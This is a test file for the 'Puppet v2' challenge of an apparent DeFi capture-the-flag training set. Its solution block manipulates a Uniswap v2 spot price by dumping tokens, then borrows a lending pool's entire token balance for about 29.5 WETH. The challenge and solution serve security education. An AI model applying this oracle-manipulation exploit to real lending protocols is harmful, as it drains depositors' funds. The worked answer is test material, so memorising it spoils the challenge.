const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json")
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json")
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")

const { ethers } = require("hardhat")
const { expect } = require("chai")
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers")

describe("[Challenge] Puppet v2", function () {
  let deployer, player
  let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n
  const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n

  const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n
  const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n

  const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, player] = await ethers.getSigners()

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
    expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE)

    const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)
    const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)
    const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)

    // Deploy tokens to be traded
    token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()
    weth = await (await ethers.getContractFactory("WETH", deployer)).deploy()

    // Deploy Uniswap Factory and Router
    uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero)
    uniswapRouter = await UniswapRouterFactory.deploy(uniswapFactory.address, weth.address)

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE)
    await uniswapRouter.addLiquidityETH(
      token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    )
    uniswapExchange = await UniswapPairFactory.attach(await uniswapFactory.getPair(token.address, weth.address))
    expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0)

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(weth.address, token.address, uniswapExchange.address, uniswapFactory.address)

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE)
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE)

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(3n * 10n ** 17n)
    expect(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).to.eq(300000n * 10n ** 18n)
  })

  /*  
		The UniswapV2 protocol uses the following math for calculating the cost of an
		asset in a pair contract:
			costForAllDVTInPool = ( reserveWETH / reserveDVT ) * amountToBorrow
			costForAllDVTInPool =  ( 10e18 / 100e18 ) * 1.000.000 = 100.000e18
			requiredWETH = costForAllDVTInPool * 3 = 300.000 WETH
		If we use the player's DVT tokens (10,000) and swap them for WETH using the Uniswap
		pair contract, it will increase the amount of DVT (from 100 to 10.100) and decrease the 
		amount of WETH (from 10 to 0,0993...).
		will affect the ratio between them significantly and change the cost of the DVT, also
		significantly: 
		
			newCostForAllDVTInPool = ( reserveWETH / reserveDVT ) * amountToBorrow
			newCostForAllDVTInPool =  ( 0,0993... / 10.100e18 ) * 1.000.000 = 9.8321...
			newRequiredWETH = costForAllDVTInPool * 3 = 29,4964... WETH
	*/

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    console.log(
      "WETH REQUIRED BEFORE SWAP: ",
      String(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
    )

    // Approve all player's DVT balance to UniswapRouter contract.
    await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)

    // Swap all DVT tokens with WETH using the UniswapRouter contract.
    await uniswapRouter.connect(player).swapExactTokensForTokens(
      PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
      0, // amountOutMin
      [token.address, weth.address], // [tokenFromUserToPool, tokenFromPoolToUser]
      player.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2 // arbitrary deadline
    )

    // Get the extra WETH needed by interacting with WETH9 contract
    await weth.connect(player).deposit({ value: ethers.utils.parseEther("19.6") })

    // Borrow all DVT tokens from pool (~29.5 WETH)
    const wethRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
    await weth.connect(player).approve(lendingPool.address, wethRequired)
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)

    console.log("WETH REQUIRED _AFTER SWAP: ", String(wethRequired))
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0)
    expect(await token.balanceOf(player.address)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE)
  })
})
